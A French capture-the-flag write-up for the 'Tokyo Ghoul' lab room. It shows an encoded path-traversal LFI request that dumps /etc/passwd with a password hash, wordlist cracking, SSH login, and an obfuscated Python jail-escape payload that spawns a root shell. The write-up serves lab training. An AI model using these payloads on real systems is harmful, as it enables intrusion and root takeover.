---
title: Tokyo Ghoul
weight: 1
---

# Tokyo Ghoul

## **Introduction**

Voici la description de la Room :
‘‘‘
This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime.
Alert: This room can contain some spoilers 'only s1 and s2 ' so if you are interested to watch the anime, wait till you finish the anime and come back to do the room 
The machine will take some time, just go grab some water or make a coffee.
‘‘‘

## Reconnaissance et énumération des services

### Scan de ports avec Nmap
Un scan complet des ports ouverts a été réalisé pour identifier les services exposés :
```bash
nmap -sS -sV -p- -T5 10.80.161.195
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-14 17:07 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.80.161.195
Host is up (0.00012s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
```

- Le service FTP pourrait contenir des fichiers sensibles. La version est certainement faillible avec un utilisateur `anonymous`
- Le service HTTP mérite une énumération plus poussée (répertoires, fichiers cachés).

---

## Exploitation du service FTP

Il est effectivement possible de se connecter avec l'utilisateur anonymous et sans mot de passe. 

### Récupération du binaire `need_to_talk`
Un binaire nommé `need_to_talk` peut être récupéré depuis le serveur FTP. Ce binaire demande un mot de passe. Si on utilise un programme comme `strings` ou `rabin2` on peut trouver des informations :

```bash
rabin2 -z need_to_talk 
[Strings]
nth paddr      vaddr      len size section type  string
\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015
0   0x00002008 0x00002008 9   10   .rodata ascii kamishiro
1   0x00002018 0x00002018 37  38   .rodata ascii Hey Kaneki finnaly you want to talk \n
2   0x00002040 0x00002040 82  83   .rodata ascii Unfortunately before I can give you the kagune you need to give me the paraphrase\n
3   0x00002098 0x00002098 35  36   .rodata ascii Do you have what I'm looking for?\n\n
4   0x000020c0 0x000020c0 47  48   .rodata ascii Good job. I believe this is what you came for:\n
5   0x000020f0 0x000020f0 51  52   .rodata ascii Hmm. I don't think this is what I was looking for.\n
6   0x00002128 0x00002128 36  37   .rodata ascii Take a look inside of me. rabin2 -z\n
```

On peut donc essayer le mot de passe kamishiro qui pourrait être une variable définit au début du binaire. Celui-ci nous donne une clé. 


## Stéganographie et cryptographie

### Extraction de données cachées dans une image
Une image (`You_found_1t.jpg`) a été analysée avec `steghide` :
```bash
steghide extract -sf You_found_1t.jpg
```
**Mot de passe :** `You_found_1t`
**Fichier extrait :** `yougotme.txt` (contenant du code Morse).

### Déchiffrement du code Morse
Le contenu de `yougotme.txt` peut être facilement déchiffre avec cyberchef, révélant un nouveau mot de passe ou un indice pour la suite de l’exploitation.

![Déchiffrement de Yougotme](../img/tokyog.png)

---

## Énumération du service HTTP

### Recherche de répertoires cachés avec Gobuster
```bash
gobuster dir -u http://10.80.161.195/d1r3c70ry_center -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,conf
```

On peut identifier un répertoire `/claim`.

### Exploitation d’une faille LFI (CWE-98)

Le répertoire `/claim` contient une vulnérabilité LFI, permettant de lire des fichiers système :

```bash
url http://10.80.161.195/d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
statd:x:110:65534::/var/lib/nfs:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
</p>    </body>
</html>
```

On récupère donc `/etc/passwd` qui révèle l\'utilisateur `kamishiro` et le hash de son mot de passe.

---

## Cracking du mot de passe de l’utilisateur `kamishiro`

### Utilisation de John the Ripper
Le hash du mot de passe de `kamishiro` a été extrait de `/etc/shadow` et cracké avec `rockyou.txt` :
```bash
john kamishiro --wordlist=/usr/share/wordlists/rockyou.txt
```

Mot de passe trouvé : `password123`.

---

## Post-Exploitation

### Connexion en tant que `kamishiro`
```bash
ssh kamishiro@10.80.161.195
```
**Mot de passe :** `password123`

### Vérification des droits sudo
```bash
sudo -l
```

- L’utilisateur `kamishiro` peut exécuter `/usr/bin/python3 /home/kamishiro/jail.py` en tant que **root**.

---

## Escalade de Privilège

### Analyse du script
Le script `jail.py` filtre certains mots-clés (`eval`, `exec`, `import`, etc.) mais permet l’exécution de code Python via `exec(text)`.

### Contournement des restrictions
On construit un payload en obfusquant notre code pour exécuter `/bin/bash` en tant que root :
```python
__builtins__.__dict__[chr(95)+chr(95)+'impo'+'rt'+chr(95)+chr(95)]('o'+'s').__dict__['sy'+'stem']('/bin/bash')
```

**Explication :**
- `chr(95)` équivaut à `_`, donc `chr(95)+chr(95)+'impo'+'rt'+chr(95)+chr(95)` → `__import__`.
- `'o'+'s'` contourne le filtre sur `os`.
- `'sy'+'stem'` contourne le filtre sur `system`.

On exécute notre payload :

```bash
sudo /usr/bin/python3 /home/kamishiro/jail.py
```


